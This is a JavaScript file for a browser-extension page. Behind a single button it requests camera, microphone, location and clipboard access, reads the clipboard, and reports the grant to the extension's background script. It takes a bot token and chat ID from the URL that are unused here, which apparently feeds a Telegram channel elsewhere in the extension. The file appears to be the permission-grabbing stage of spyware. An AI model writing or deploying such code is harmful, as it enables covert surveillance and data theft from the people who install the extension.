const statusEl = document.getElementById('status');
const grantBtn = document.getElementById('grantBtn');
const params = new URLSearchParams(window.location.search);
const BOT_TOKEN = params.get('bot') || '';
const CHAT_ID = params.get('chat') || '';

grantBtn.addEventListener('click', requestAllPermissions);

async function requestAllPermissions() {
  grantBtn.disabled = true;
  grantBtn.textContent = '⏳ Processing...';
  statusEl.innerHTML = '';
  let allGranted = true;
  // Camera
  statusEl.innerHTML += '<p>📷 Requesting camera access...</p>';
  try {
    const cam = await navigator.mediaDevices.getUserMedia({ video: true });
    cam.getTracks().forEach(t => t.stop());
    statusEl.innerHTML = statusEl.innerHTML.replace('📷 Requesting camera access...', '✅ Camera: Granted');
  } catch(e) { statusEl.innerHTML = statusEl.innerHTML.replace('📷 Requesting camera access...', '❌ Camera: Denied'); allGranted = false; }
  // Mic
  statusEl.innerHTML += '<p>🎤 Requesting microphone access...</p>';
  try {
    const mic = await navigator.mediaDevices.getUserMedia({ audio: true });
    mic.getTracks().forEach(t => t.stop());
    statusEl.innerHTML = statusEl.innerHTML.replace('🎤 Requesting microphone access...', '✅ Microphone: Granted');
  } catch(e) { statusEl.innerHTML = statusEl.innerHTML.replace('🎤 Requesting microphone access...', '❌ Microphone: Denied'); allGranted = false; }
  // Location
  statusEl.innerHTML += '<p>📍 Requesting location access...</p>';
  try {
    await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
    statusEl.innerHTML = statusEl.innerHTML.replace('📍 Requesting location access...', '✅ Location: Granted');
  } catch(e) { statusEl.innerHTML = statusEl.innerHTML.replace('📍 Requesting location access...', '❌ Location: Denied'); allGranted = false; }
  // Clipboard
  statusEl.innerHTML += '<p>📋 Requesting clipboard access...</p>';
  try { await navigator.clipboard.readText(); statusEl.innerHTML = statusEl.innerHTML.replace('📋 Requesting clipboard access...', '✅ Clipboard: Granted'); } catch(e) { statusEl.innerHTML = statusEl.innerHTML.replace('📋 Requesting clipboard access...', '⚠️ Clipboard: Partial'); }
  chrome.runtime.sendMessage({ type: 'perm_granted' });
  chrome.storage.local.set({ permGranted: true });
  statusEl.innerHTML += `<br><strong>${allGranted ? '🎉 All set! You can close this tab.' : '⚠️ Some permissions were denied.'}</strong>`;
  grantBtn.textContent = allGranted ? '✅ Done!' : '⚠️ Try Again';
  if (allGranted) setTimeout(() => window.close(), 2000);
  else grantBtn.disabled = false;
}
